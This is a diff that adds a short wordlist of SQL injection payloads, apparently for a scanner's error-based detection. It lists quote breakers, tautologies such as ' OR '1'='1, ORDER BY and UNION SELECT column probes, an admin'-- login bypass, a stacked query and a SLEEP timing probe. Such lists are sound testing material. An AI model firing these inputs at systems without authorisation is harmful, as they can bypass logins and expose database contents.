@@ -1,0 +1,21 @@
+# SQL injection payloads — error-based detection
+# One payload per line; lines starting with # are comments; blank lines are ignored.
+# These payloads are designed to trigger database error messages.
+
+'
+''
+' OR '1'='1
+' OR 1=1--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' AND 1=1--
+' AND 1=0--
+admin'--
+' OR 'x'='x
+1; SELECT 1--
+' OR ''='
+1' AND SLEEP(0)--
